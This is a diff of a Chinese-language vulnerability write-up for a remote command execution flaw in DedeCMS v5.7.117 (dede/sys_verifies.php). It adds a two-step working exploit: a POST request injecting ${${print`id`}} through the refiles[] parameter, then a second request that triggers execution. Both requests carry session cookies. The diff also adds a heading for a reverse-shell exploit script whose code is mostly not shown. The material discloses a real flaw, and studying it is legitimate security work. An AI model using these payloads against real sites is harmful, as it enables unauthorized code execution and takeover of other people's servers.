@@ -1,5 +1,11 @@
+## DedeCMS v5.7.117存在远程命令执行漏洞
+
+### Description
+
+DedeCMS V5.7.117 has a Command Injection in **dede/sys_verifies.php**. 
 
 ### CMS下载
+
 [产品下载 / 织梦 (DedeCMS) 官方网站 - 内容管理系统 - 上海卓卓网络科技有限公司](https://www.dedecms.com/download)
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221330019.png)
 
@@ -199,22 +205,59 @@ else if ($action == 'getfiles')
 
 典型的"文件包含后利用"模式，先将恶意代码写入文件，再诱导系统加载执行该文件。
 
-
+### 步骤一，先包含
 
 ```http
-GET /dede/sys_verifies.php?action=getfiles&refiles[]=xxx${${print%20`id`}} HTTP/1.1
+POST /dede/sys_verifies.php HTTP/1.1
 Host: www.dede.top
-Referer: http://www.dede.top/dede/sys_verifies.php?action=update
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=a3bn6g1kp33cq4k9hvpjbivpi7; _csrf_name_74ae9ccb=c925a121063eed11f995b54519d602db; _csrf_name_74ae9ccb1BH21ANI1AGD297L1FF21LN02BGE1DNG=dfb98404214bdb4e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=46f5b1c017a14f40; DedeLoginTime=1747809483; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=ca7fa831cb99a339
+Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=vjtlnq0jvrql4iuveubluted36; _csrf_name_74ae9ccb=0afd0608d1019e243ccd2edfa52c8d53; _csrf_name_74ae9ccb1BH21ANI1AGD297L1FF21LN02BGE1DNG=101e27f26cfdc22e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=46f5b1c017a14f40; DedeLoginTime=1748391833; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8c5466a9a07e334a
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Origin: http://www.dede.top
+Referer: http://www.dede.top/dede/sys_verifies.php?action=getfiles
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Length: 43
+
+action=getfiles&refiles%5B%5D=xxx$%7B$%7Bprint%60id%60%7D%7D
+```
+
+![image-20250528084731526](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280847888.png)
+
+### 步骤二，再触发
+
+```http
+POST /dede/sys_verifies.php HTTP/1.1
+Host: www.dede.top
+Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=vjtlnq0jvrql4iuveubluted36; _csrf_name_74ae9ccb=0afd0608d1019e243ccd2edfa52c8d53; _csrf_name_74ae9ccb1BH21ANI1AGD297L1FF21LN02BGE1DNG=101e27f26cfdc22e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=46f5b1c017a14f40; DedeLoginTime=1748391833; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8c5466a9a07e334a
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Origin: http://www.dede.top
+Referer: http://www.dede.top/dede/sys_verifies.php?action=getfiles
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Length: 43
+
+action=down&curfile=1
 ```
 
 
+
+![image-20250528084804482](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280848716.png)
+
+
+
+### 反弹shell_EXP
 
 ```python
 #!/usr/bin/env python3
@@ -310,3 +353,5 @@ if __name__ == "__main__":
 
 
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505211523431.png)
+
+<video src="C:/Users/XU/DedeCMS v5.7.117-RCE.mp4"></video>
